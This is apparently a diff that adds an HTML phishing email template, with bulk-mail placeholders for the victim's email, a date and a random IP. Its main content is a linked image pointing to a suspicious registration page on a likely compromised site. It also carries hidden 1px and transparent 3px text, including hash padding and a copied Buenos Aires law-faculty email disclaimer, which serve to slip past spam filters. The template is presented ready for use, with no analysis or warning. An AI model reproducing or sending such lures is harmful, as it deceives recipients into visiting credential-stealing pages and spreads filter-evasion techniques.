@@ -1,0 +1,23 @@
+
+
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<h2 style="font-family: arial, helvetica, sans-serif;"><span style="font-size: 1px;">Hello ##email##, ##date##  UlD: ##randomip##  <br>50dee43e3a5b38631a2b870607dfcf8550dee43e3a5b38631a2b870607dfcf8550dee43e3a5b38631a2b870607dfcf85</span>
+<div>&nbsp;</div>
+
+<h2><a href="https://fbmediaz.com/plugin/ckfinder/userfiles/registration/cfm0/index.html"><img src="http://igottajet.com/googleauth/scqATZnnjVFaafRzDTv6kQKs1MGca4ICh8da8AysweCGutf7nLeIBYaCLRPVWxydGLoOmWgSaTzFnOMK.png" /></a></h2>
+
+<p style="margin: 0px 0px 10px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-stretch: inherit; font-size: 3px; line-height: inherit; font-family: Courier, monospace; vertical-align: baseline; color: transparent; background-color: transparent;">
+
+cuenta de correo electrónico es exclusivamente para uso académico. La Facultad de Derecho de la Universidad de Buenos Aires no se hace responsable por usos que excedan tales propósitos. Este mensaje podría contener información o archivos adjuntos confidenciales y ha sido enviado solo a los destinatarios mencionados. Si usted no es uno de los destinatarios mencionados, por favor tenga a bien responder este mensaje para informárselo al remitente y borre este mensaje y sus adjuntos sin retener una copia.
+
+
+
+</p>
+
+
+</body>
+</html>
